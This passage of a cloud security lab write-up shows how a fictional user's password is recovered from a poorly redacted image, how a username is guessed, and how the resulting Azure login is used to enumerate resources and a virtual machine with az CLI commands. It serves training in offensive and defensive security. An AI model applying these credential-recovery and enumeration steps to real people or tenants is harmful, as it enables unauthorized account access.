+<li>First of all we start by downloading the image this user posted on their social media from <a href="https://drive.google.com/file/d/1bMYfsRp5U7vpTWVyiHon09qouZ-HBpIr/view?usp=sharing">here</a></li>
+<li>The image says &ldquo;<strong><code>#newoffice Rate.....</code></strong>&rdquo; with a redacted text using a Markup&rsquo;s pencil, which poses significant risk as shown in this <a href="https://security.stackexchange.com/questions/161436/is-it-possible-for-someone-to-see-under-the-blacked-out-part-of-this-image-se/198905#198905">forum</a></li>
+<li>However it is possible to use <code>GIMP</code>, An image manipulation program to retrieve the obscured text.
+<ul>
+<li>Under the <strong><code>Colors</code></strong> drop down menu select <strong><code>Brightness-Contract..</code></strong> and edit.</li>
+</ul>
+</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/svbxXYF.png"></p>
+<ul>
+<li>
+<p>We got the text <code>SUMMERDAZE1!</code> or maybe we can call it a password.</p>
+</li>
+<li>
+<p>The next thing we need is this user actual username, We know they go by the name &ldquo;<strong><code>Matteus Lundgren</code></strong>&rdquo; but how is it saved on the domain ?.</p>
+</li>
+<li>
+<p>For active directory On-Prem, I have found this <a href="https://github.com/initstring/linkedin2username">tool</a> to be useful as it creates a possible username from a given username and company name.</p>
+</li>
+<li>
+<p>However it is possible to guess this one as <strong>Mega Big Tech</strong> uses the below format :</p>
+<ul>
+<li><code>&lt;firstname&gt;@megabigtech.com</code></li>
+<li>`<a href="mailto:first.last@megabigtech.com">first.last@megabigtech.com</a></li>
+</ul>
+</li>
+<li>
+<p>With this format we can go ahead and try to login with a PS Session</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">az</span> <span class="n">login</span> 
+</span></span></code></pre></div><ul>
+<li>Which worked as shown in the below screenshot</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/LNHP3Sy.png"></p>
+<ul>
+<li>We can also confirm that we have successfully login with the below command</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">account</span> <span class="n">show</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;environmentName&#34;</span><span class="err">:</span> <span class="s2">&#34;AzureCloud&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;homeTenantId&#34;</span><span class="err">:</span> <span class="s2">&#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;isDefault&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;managedByTenants&#34;</span><span class="err">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;Microsoft Azure Sponsorship&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;state&#34;</span><span class="err">:</span> <span class="s2">&#34;Enabled&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantDefaultDomain&#34;</span><span class="err">:</span> <span class="s2">&#34;megabigtech.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantDisplayName&#34;</span><span class="err">:</span> <span class="s2">&#34;Default Directory&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantId&#34;</span><span class="err">:</span> <span class="s2">&#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;user&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;matteus@megabigtech.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="err">:</span> <span class="s2">&#34;user&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>To understand the standpoint we are in, we can go ahead and list all resources that our current user has access to.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">resource</span> <span class="n">list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;changedTime&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-11-30T17:17:51.364990+00:00&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;createdTime&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-11-30T17:07:03.686020+00:00&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;extendedLocation&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;identity&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;kind&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;location&#34;</span><span class="err">:</span> <span class="s2">&#34;eastus&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;managedBy&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;plan&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;properties&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;provisioningState&#34;</span><span class="err">:</span> <span class="s2">&#34;Succeeded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;resourceGroup&#34;</span><span class="err">:</span> <span class="s2">&#34;mbt-rg-5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sku&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tags&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="err">:</span> <span class="s2">&#34;Microsoft.Compute/virtualMachines&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;zones&#34;</span><span class="err">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></div><blockquote>
+<p>As show above we have access to a virtual machine named <code>AUTOMAT01</code> in the <code>mbt-rg-5</code> resource group.</p>
+</blockquote>
+<ul>
+<li>We can therefore take a step further to retrieve general information about this virtual machine</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">vm</span> <span class="n">show</span> <span class="p">-</span><span class="n">-resource-group</span> <span class="nb">mbt-rg</span><span class="p">-</span><span class="mf">5</span> <span class="p">-</span><span class="n">-name</span> <span class="n">AUTOMAT01</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;additionalCapabilities&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hibernationEnabled&#34;</span><span class="err">:</span> <span class="n">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ultraSsdEnabled&#34;</span><span class="err">:</span> <span class="n">null</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;applicationProfile&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;availabilitySet&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;billingProfile&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;capacityReservation&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;diagnosticsProfile&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;evictionPolicy&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;extendedLocation&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;extensionsTimeBudget&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;hardwareProfile&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vmSize&#34;</span><span class="err">:</span> <span class="s2">&#34;Standard_B1ms&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vmSizeProperties&#34;</span><span class="err">:</span> <span class="n">null</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;host&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;hostGroup&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;identity&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;instanceView&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;licenseType&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;location&#34;</span><span class="err">:</span> <span class="s2">&#34;eastus&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;networkProfile&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;networkApiVersion&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;networkInterfaceConfigurations&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;networkInterfaces&#34;</span><span class="err">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;deleteOption&#34;</span><span class="err">:</span> <span class="s2">&#34;Detach&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;primary&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;resourceGroup&#34;</span><span class="err">:</span> <span class="s2">&#34;mbt-rg-5&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;osProfile&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;adminPassword&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;adminUsername&#34;</span><span class="err">:</span> <span class="s2">&#34;automation&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;allowExtensionOperations&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;computerName&#34;</span><span class="err">:</span> <span class="s2">&#34;AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;customData&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;linuxConfiguration&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;disablePasswordAuthentication&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;enableVmAgentPlatformUpdates&#34;</span><span class="err">:</span> <span class="n">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;patchSettings&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;assessmentMode&#34;</span><span class="err">:</span> <span class="s2">&#34;ImageDefault&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;automaticByPlatformSettings&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;patchMode&#34;</span><span class="err">:</span> <span class="s2">&#34;ImageDefault&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">},</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;provisionVmAgent&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;ssh&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;publicKeys&#34;</span><span class="err">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;keyData&#34;</span><span class="err">:</span> <span class="s2">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6mR2ZA1xLw4xONa+hQYoVGcmKMZtVU+WVQjREfDgHsDZSIjDrvXAPOQe9falxs3Wj14EjOzPyCtnq3teFrqUaUjiFohaZTdU5mKikVFhLyG8hHvTp1QEI9bBYOVSi2n3pUUKq16VgZwpPIWJscdRJcFiN03mhC1clZwu4T/p7lFFNlGW33SxNN7vaXA05lX2laF3UGTBjU5fzRJ4zzC1Nn5OEUwIyRKsGE6uy/rZxhr5qrjGpthL27KpssXKcg9tJgTBsMTwQWsBSLCjUjrJv1VCQKkGlY5UXRck24TdVSSYt7j/m6G702huC1DrDEtbjXSGWZ17MT1RRIqChsdUY2l3+g8TSPaHyrxkC4y6q8scUWVgrIcvUHqtAJhYmEyeRVtiJcKSerqKdwsyNuIUbflkc/l99n0Dr1cyj/LDRdxVzjSjWxKMRxPgWrZ/kQ9mC5PicXuLXlQTceiIlExT59UTaYFpHmpmnarE3yzCRdqHyMfdu3tmsTEp39vt+7i0= generated-by-azure&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;path&#34;</span><span class="err">:</span> <span class="s2">&#34;/home/automation/.ssh/authorized_keys&#34;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;requireGuestProvisionSignal&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;secrets&#34;</span><span class="err">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;windowsConfiguration&#34;</span><span class="err">:</span> <span class="n">null</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;plan&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;platformFaultDomain&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;priority&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;provisioningState&#34;</span><span class="err">:</span> <span class="s2">&#34;Succeeded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;proximityPlacementGroup&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;resourceGroup&#34;</span><span class="err">:</span> <span class="s2">&#34;mbt-rg-5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;resources&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;scheduledEventsProfile&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;securityProfile&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;storageProfile&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;dataDisks&#34;</span><span class="err">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;diskControllerType&#34;</span><span class="err">:</span> <span class="s2">&#34;SCSI&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;imageReference&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;communityGalleryImageId&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;exactVersion&#34;</span><span class="err">:</span> <span class="s2">&#34;20.04.202310250&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;offer&#34;</span><span class="err">:</span> <span class="s2">&#34;0001-com-ubuntu-server-focal&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;publisher&#34;</span><span class="err">:</span> <span class="s2">&#34;canonical&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;sharedGalleryImageId&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;sku&#34;</span><span class="err">:</span> <span class="s2">&#34;20_04-lts-gen2&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;version&#34;</span><span class="err">:</span> <span class="s2">&#34;latest&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;osDisk&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;caching&#34;</span><span class="err">:</span> <span class="s2">&#34;ReadWrite&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;createOption&#34;</span><span class="err">:</span> <span class="s2">&#34;FromImage&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;deleteOption&#34;</span><span class="err">:</span> <span class="s2">&#34;Delete&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;diffDiskSettings&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;diskSizeGb&#34;</span><span class="err">:</span> <span class="mf">30</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;encryptionSettings&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;image&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;managedDisk&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;diskEncryptionSet&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/disks/AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;resourceGroup&#34;</span><span class="err">:</span> <span class="s2">&#34;mbt-rg-5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;securityProfile&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;storageAccountType&#34;</span><span class="err">:</span> <span class="s2">&#34;Standard_LRS&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">},</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;osType&#34;</span><span class="err">:</span> <span class="s2">&#34;Linux&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;vhd&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;writeAcceleratorEnabled&#34;</span><span class="err">:</span> <span class="n">null</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tags&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;timeCreated&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-11-30T17:07:03.721328+00:00&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;type&#34;</span><span class="err">:</span> <span class="s2">&#34;Microsoft.Compute/virtualMachines&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;userData&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;virtualMachineScaleSet&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;vmId&#34;</span><span class="err">:</span> <span class="s2">&#34;fc3e4e78-01a7-4cf2-a79c-1b897b6c951e&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;zones&#34;</span><span class="err">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Here’s a breakdown of the vital information from the output of your above command:</p>
+<ul>
+<li>
+<p><strong>VM Name:</strong> <code>AUTOMAT01</code></p>
+</li>
+<li>
+<p><strong>Resource Group:</strong> <code>mbt-rg-5</code></p>
+</li>
+<li>
+<p><strong>Location:</strong> <code>eastus</code></p>
+</li>
+<li>
+<p><strong>VM Size:</strong> <code>Standard_B1ms</code> (Basic tier, 1 vCPU, 2 GiB RAM)</p>
+</li>
+<li>
+<p><strong>OS Disk Size:</strong> 30 GB (Managed disk with <code>Standard_LRS</code> storage)</p>
+</li>
+<li>
+<p><strong>OS Type:</strong> Linux (Ubuntu 20.04 LTS)</p>
+</li>
+<li>
+<p><strong>Admin Username:</strong> <code>automation</code></p>
+</li>
+<li>
+<p><strong>SSH Public Key:</strong> An SSH public key has been deployed for the user <code>automation</code>, located at <code>/home/automation/.ssh/authorized_keys</code>.</p>
+</li>
+<li>
+<p><strong>VM State:</strong> Provisioning state is <code>Succeeded</code> (VM creation was successful).</p>
+</li>
+<li>
+<p><strong>Disk Encryption:</strong> No disk encryption settings enabled.</p>
+</li>
+<li>
+<p><strong>Zone:</strong> The VM is located in availability zone <code>1</code>.</p>
+</li>
+<li>
+<p><strong>Network:</strong></p>
+<ul>
+<li>The VM is associated with a network interface <code>/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1</code>.</li>
+</ul>
+</li>
+<li>
+<p>According to the lab, since we have a public key for SSH, it is worth noting down an IP address for this Virtual Machine, However we have the following error</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">vm</span> <span class="n">show</span> <span class="n">-d</span> <span class="n">-g</span> <span class="nb">mbt-rg</span><span class="p">-</span><span class="mf">5</span> <span class="n">-n</span> <span class="n">AUTOMAT01</span> <span class="p">-</span><span class="n">-query</span> <span class="n">publicIps</span> <span class="n">-o</span> <span class="n">tsv</span>
+</span></span><span class="line"><span class="cl">
